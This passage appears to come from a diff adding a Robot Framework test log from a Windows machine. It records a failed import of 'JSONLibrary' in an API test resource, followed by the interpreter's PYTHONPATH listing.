+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\Scripts\robot.exe
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39
+  c:\users\palak.vora\appdata\local\programs\python\python39\python39.zip
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\DLLs
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib
+  C:\Users\palak.vora\AppData\Roaming\Python\Python39\site-packages
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib\site-packages</msg>
+<msg timestamp="20210529 13:33:21.683" level="ERROR">Error in file 'D:\COE_Automation\Resources\API.robot' on line 6: Importing library 'JSONLibrary' failed: ModuleNotFoundError: No module named 'JSONLibrary'
+Traceback (most recent call last):
+  None
+PYTHONPATH:
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\Scripts\robot.exe
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39
+  c:\users\palak.vora\appdata\local\programs\python\python39\python39.zip
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\DLLs
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib
+  C:\Users\palak.vora\AppData\Roaming\Python\Python39\site-packages
+  C:\Users\palak.vora\AppData\Local\Programs\Python\Python39\lib\site-packages</msg>
+</errors>
+</robot>
